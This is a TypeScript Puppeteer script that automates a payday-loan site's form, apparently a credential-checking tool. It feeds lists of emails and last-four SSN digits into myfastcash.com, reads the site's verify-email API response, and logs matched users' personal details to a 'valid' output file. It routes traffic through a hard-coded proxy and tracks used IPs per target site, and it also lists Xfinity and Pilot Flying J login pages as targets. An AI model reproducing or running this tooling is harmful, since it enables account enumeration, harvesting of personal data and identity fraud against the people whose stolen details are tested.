import axios from 'axios';
import ip from 'ip';
import pupeeteer, { Browser } from 'puppeteer';
import { Credential } from './interface/credential';
import {
  LOAN_AMOUNTS,
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
  TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES,
} from './constants';
import {
  generateOutputMessage,
  getRamdomValue,
  minutesToMilliseconds,
} from './utils';
import path from 'path';
import fs from 'fs';
import logger from './logger/logger';
import { MyFastCashUserResponse } from './interface/my-fast-cash';

export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
  TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
);

export const TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MILLISECONDS =
  minutesToMilliseconds(TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES);

export const SCREENSHOT_DISABLED = true;

const logTracking = (message: string, email: string) => {
  logger.warn(`${message} || ${email}`);
};

const getLoanAmountValue = () =>
  LOAN_AMOUNTS[getRamdomValue(0, LOAN_AMOUNTS.length - 1)];

interface PageConfiguration {
  pageUrl: string;
  loanAmountSelector: string;
  formSelector: string;
}

interface ConfigurationPerPage {
  xfinity: PageConfiguration;
  pilotflyingj: PageConfiguration;
  myfastcash: PageConfiguration;
}

const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
  xfinity: {
    pageUrl: 'https://login.xfinity.com/login',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
  pilotflyingj: {
    pageUrl: 'https://loyaltyportal.pilotflyingj.com/myrewards/login',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
  myfastcash: {
    pageUrl: 'https://myfastcash.com/login',
    loanAmountSelector: '#amount',
    formSelector: '#homepage-form',
  },
};

const SELECTORS = {
  emailInput: '#email',
  ssnInput: '#ssnLast4',
  loanAmountInput: '#loan_amount',
  password: '#Password',
  submitButton: '#form-submit',
  userHint: '#user-hint',
  passwdHint: '#passwd-hint',
};

const getIP = async () => {
  try {
    const { data: ip } = await axios.get<string>('https://api.ipify.org', {
      proxy: {
        protocol: 'http',
        host: '162.244.132.210',
        port: 6021,
      },
    });
    return ip;
  } catch (error) {
    logger.error(error);
    // defualt ip when request fails
    return '127.0.0.1';
  }
};

const validateIp = async (
  ip: string,
  pageConfigKey: keyof ConfigurationPerPage,
) => {
  const IPs_Directory = path.join(`${__dirname}/data/ips`);

  if (!fs.existsSync(IPs_Directory)) {
    fs.mkdirSync(IPs_Directory, { recursive: true });
  }

  const readFile = async () => {
    if (!fs.existsSync(`${IPs_Directory}/${pageConfigKey}.txt`)) {
      fs.writeFileSync(`${IPs_Directory}/${pageConfigKey}.txt`, '', 'utf8');
    }

    const fileContent = await fs.promises.readFile(
      `${IPs_Directory}/${pageConfigKey}.txt`,
      'utf8',
    );

    return fileContent;
  };

  const fileData = await readFile();

  const ipsData = fileData ? fileData.split(/\n/).filter(Boolean) : [];

  const isIPUsed = [...ipsData, '127.0.0.1'].includes(ip);

  if (!isIPUsed) {
    logger.warn(`New IP: ${ip}`);

    ipsData.push(ip);

    fs.writeFileSync(
      `${IPs_Directory}/${pageConfigKey}.txt`,
      ipsData.join('\n'),
      'utf8',
    );
  }

  return isIPUsed;
};

export const getCredentialInformationScrapper = async (
  browser: Browser,
  credential: Credential,
  validWriteLineOnFile: (line: string) => void,
  invalidWriteLineOnFile: (line: string) => void,
  validFileName: string,
  pageConfigKey: keyof ConfigurationPerPage,
) => {
  const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];

  // const HEADLESS = false;

  // let _browser = await pupeeteer.launch({
  //   headless: HEADLESS,
  //   // headless: false,
  //   // args: ['--proxy-server=162.244.132.210:6021'],
  // });

  const page = await browser.newPage();
  // let page = await _browser.newPage();

  await page.setViewport({
    width: 1920,
    height: 1080,
  });

  // await page.setRequestInterception(true);

  // let response: MyFastCashUserResponse | null = null;

  // page.on('response', async (interceptedResponse) => {
  //   if (interceptedResponse.url().includes('api/verify-email')) {
  //     response = (await interceptedResponse.json()) as MyFastCashUserResponse;
  //     console.log({ response });
  //   }
  // });

  let ip = '';

  let isInvalidIp = true;

  try {
    await page.goto(pageUrl, {
      waitUntil: 'networkidle2',
    });

    const screenshotRedirectDirectory = path.join(
      `${__dirname}/data/screenshots-redirect/${validFileName}`,
    );

    if (!fs.existsSync(screenshotRedirectDirectory)) {
      fs.mkdirSync(screenshotRedirectDirectory, { recursive: true });
    }

    const screenshotRedirectPath = path.join(
      `${screenshotRedirectDirectory}/${credential.email}.png`,
    );

    // await page.select(loanAmountSelector, loanAmountValue);

    // TODO: Add logic to select a loan amount

    // await page.type(SELECTORS.lastNameInput, credential.lastname);

    // await page.type(SELECTORS.firstNameInput, credential.name);

    await page.waitForSelector(SELECTORS.emailInput);
    await page.type(SELECTORS.emailInput, credential.email);

    await page.waitForSelector(SELECTORS.ssnInput);
    await page.type(SELECTORS.ssnInput, credential.last4ssn);

    await page.waitForSelector(SELECTORS.loanAmountInput);
    await page.type(SELECTORS.loanAmountInput, '1500');

    await page.waitForSelector(SELECTORS.submitButton);
    await page.click(SELECTORS.submitButton);

    const finalResponse = await page.waitForResponse(
      'https://myfastcash.com/api/verify-email',
    );

    let response = (await finalResponse.json()) as MyFastCashUserResponse;

    // console.log({ response });

    // await Promise.all([
    //   await page.waitForNavigation({
    //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
    //     waitUntil: 'domcontentloaded',
    //   }),
    // ]);

    await new Promise((r) => setTimeout(r, 800));

    if (response && response.found && response.body) {
      const userInformation = Object.entries(response.body)
        .map(([key, value]) => `${key}=${value}`)
        .join(' ');

      const outputMessage = generateOutputMessage(
        credential,
        page.url(),
        userInformation,
      );

      logger.info(outputMessage);

      validWriteLineOnFile(outputMessage);
    } else {
      const outputMessage = generateOutputMessage(credential, page.url());

      logger.error(outputMessage);

      invalidWriteLineOnFile(outputMessage);
    }

    // if (page.url().includes('registration/returning')) {
    //   //logic to validate if is good
    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);

    //   logger.info(outputMessage);

    //   validWriteLineOnFile(outputMessage);
    // } else {
    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);

    //   logger.error(outputMessage);

    //   invalidWriteLineOnFile(outputMessage);
    // }

    if (SCREENSHOT_DISABLED) {
      await page.screenshot({
        path: screenshotRedirectPath,
      });
    }
  } catch (error) {
    console.error(error);
    logTracking(
      `ERROR WITH ${credential.email}!!!`,
      `${credential.email} || url=${page.url()} `,
    );

    logger.error(
      `getCredentialInformationScrapper ERROR: ${error} || EMAIL:${
        credential.email
      } || URL: ${page.url()}`,
    );
  } finally {
    // await _browser.close();
    await page.close();
  }
};
